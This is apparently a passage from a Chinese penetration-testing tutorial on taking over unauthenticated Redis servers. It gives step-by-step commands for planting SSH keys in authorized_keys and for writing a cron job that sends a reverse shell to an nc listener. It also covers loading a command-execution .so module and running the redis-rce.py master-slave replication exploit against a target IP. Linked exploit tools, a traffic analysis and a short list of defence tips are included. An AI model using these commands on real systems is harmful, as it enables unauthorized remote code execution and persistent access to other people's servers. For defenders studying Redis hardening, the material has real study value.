**ssh-keygen**
输入命令，填写公钥私钥文件名，其中密码可以为空。  
.pub扩展名为我们需要写入的公钥
    ssh-keygen -t rsa    生成公钥和私钥
在上面写入webshell中，可以看到我们写入到文件中，文件不会只有我们写入的内容，所以这里需要将公钥的内容进行一个补充，在头尾加入换行符。
**xshell**
打开xshell->左上角点击文件->新建->用户身份认证->方法选`public key`->用户密钥处点击浏览就可以开始生成私钥和公钥了
点击生成然后下一步下一步，填写公钥私钥的文件名称，然后下一步(密码可以为空)。
点击下一步，可以看到框里面的就是私钥的内容，和上面ssh-keygen的私钥差不多。
在头尾加入换行符就准备好写入的内容了。
**redis-cli**
步骤和写入webshell差不多。  
查看所有键值，创建新建并且赋值，这里我创建2个键，x为`xshell`生成的公钥，s为`ssh-keygen`生成的公钥。
设置写入文件路径，文件名称，完成公钥的写入。  
若为root启动redis服务，那么文件路径设置为`/root/.ssh`。  
若为redis或者其他用户启动，那设置为`/home/user/.ssh`。
成功写入后，直接利用ssh或者xshell进行连接即可。
**ssh连接**
    ssh -i 私钥 user@ip
**xshell连接**
方法选为public key，选择上传的公钥对应的私钥。
    keys *    查看所有键
    set x "\n\n公钥内容\n\n"    创建x键并且赋值
    config get *    查看设置默认值
    config set dir /home/cooltige/.ssh    设置文件写入目录
    config set dbfilename authorized_keys    设置写入文件名
    save    保存，完成文件写入
    del x    删除创建的x键
    config set dir /home/cooltige/redis-3.0.0    设置回原来的目录
    config set dbfilename dump.rdb    设置回原来的文件名
**Redis Desktop Manager**
方法步骤都差不多，这里我就直接演示写入成功和连接状态。
连接失败。查看服务器上文件写入的内容。
可以看到`\n`和写入webshell的效果一样的，没有被当作为换行符，公钥写入和webshell不一样，公钥之间以换行符进行区分，这个地方将所有的内容当成为公钥了，所以没办法进行一个连接。  
不过我们可以在创建键的时候，通过回车代替`\n`达到一个换行符的效果。
**蚁剑redis数据库插件**
蚁剑redis数据库插件通过set的方式创建键值然后写入公钥，结果显而易见，也是没办法进行一个连接的。所以我们通过右键新增key来进行键值的创建。
同redis desktop manager一样用回车代替`\n`。
执行剩下的操作，写入公钥。
连接成功。
## 写定时任务反弹shell
必要条件:
  * 拥有计划任务目录写权限
  * 目标启动计划服务
环境：
  * redis 3.0.0
  * CentOS Linux release 7.8.2003 (Core)
写计划任务必须拥有计划任务目录的写权限，所有这里以Root进行redis服务的启动。
kali进行一个监听 `nc -lvp 8986`.
这里主要以`redis-cli`连接方式进行演示。剩下2种方式操作参考上面就行了。
设置键并且赋值，设置文件输出目录，设置输出文件名，这里是以root启动服务，所有文件名就设置为root。  
这里计划任务的意思为每分钟执行下反弹命令。
过了1分钟，shell完成反弹。
测试了centos7和ubuntu，默认情况下redis写入计划任务反弹shell，在centos下是可以的。
由于redis写入文件会写入脏数据，ubuntu计划任务不允许有脏数据，所以ubuntu没办法通过redis写入计划任务进行操作。
    keys *    查看所有键
    set x "\n\n计划任务内容\n\n"    创建x键并且赋值
    config get *    查看设置默认值
    config set dir /var/spool/cron    设置文件写入目录
    config set dbfilename root    设置写入文件名
    save    保存，完成文件写入
    del x    删除创建的x键
    config set dir /home/cooltige/redis-4.0.0    设置回原来的目录
    config set dbfilename dump.rdb    设置回原来的文件名
## 模块加载执行命令
必要条件：
  * 目标服务器上有`.so`文件
  * redis支持module命令
环境:
  * redis 4.0.0
so文件下载地址：[exp.so](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand)
在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出`.so`文件。
主要原理为webshell上传`.so`文件，然后通过`redis`的`module`命令进行加载`.so`  
文件，然后进行系统命令执行，这里主要是讲解利用方式，我就不对`.so`文件原理进行一个讲解。
实战中这种用法一般用在getshell后，上传`.so`文件进行一个命令执行。
所以这里我主要以蚁剑redis数据库插件进行一个演示。
通过webshell将我们的`.so`文件上传到目标服务器上。
利用模块连接数据库，执行命令加载模块。
删除模块，查看是否删除成功。
    module load /tmp/557.so    加载模块
    system.exec "whoami"    执行命令
    module list    查看现有模块
    module unload system    删除模块
若目标以root权限启动redis，在实战中就可以利用这种方式进行一个提权。
## 主从复制rce
主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。
默认情况下，每台Redis服务器都是主节点；且一个主节点可以有多个从节点(或没有从节点)，但一个从节点只能有一个主节点。
主从复制RCE主要原理就是，攻击机通过协议认证成为主节点，目标redis服务器为从节点，通过全量复制将文件内容输出到目标服务器上(也就是写入so文件)。然后加载`.so`文件，完成命令执行。
必要条件：
  * redis版本 >= 4.x
利用过程了解了，实现只需要写一个脚本就可以了。
脚本下载：[redis_rce](https://github.com/Ridter/redis-rce)
执行脚本，填入本地ip，redis服务器ip，so文件，选择i可以直接交互执行命令。
    python redis-rce.py -L 192.168.111.132 -r 192.168.111.135 -f 557.so
这里再演示下选择r。监听一个端口，脚本会弹个shell过来。
* * *
通过wireshark抓包分析流量。
首先会执行Info获取信息。
这时候主要python脚本做了八件事:
    本机设置为主机ip:192.168.111.132 port:21000
    设置从机上导出的文件557.so
    加载全量复制完成后在从机上生成的557.so文件
    断开主从机器间复制(从节点不会删除已有的数据，只是不再接受主节点新的数据变化)
    执行命令
    还原dbfilename
    通过命令删除主从复制到redis服务器上的so文件
    移除加载的命令执行模块
其中2、3步之间为主从复制的关键。
通过[redis-rogue-server](https://github.com/LoRexxar/redis-rogue-server)脚本来查看2、3步之间的操作。
我将一些符号进行去除，最后得到这些内容。
其中主要的操作为：
    主节点会向从节点发送PING命令，这个PING命令的作用，主要是为了让从节点进行超时判断
    从服务器将执行命令REPLCONF listening-port 6379，向主服务器发送从服务器的监听端口号。执行REPLCONF capca eof capa psync2，主要是为了兼容不同版本，主机根据这些对从机采取不同的操作。
    开始全量复制
# 防御建议
  * 设置密码并且保证密码口令为强口令
  * 以低权限启动redis数据库
  * 不允许数据库外联并且设置白名单ip
# 总结
  * 当目标为ubuntu的时候，由于自身机制原因，是没办法进计划任务写入的利用。
  * 一切关于写入的操作都是覆盖，操作的时候一定要慎重。
  * 根据不同的环境选择不同的连接方式可以更好的进行利用。
  * 模块加载和主从复制rce目标数据库版本必须大于等于4.0.0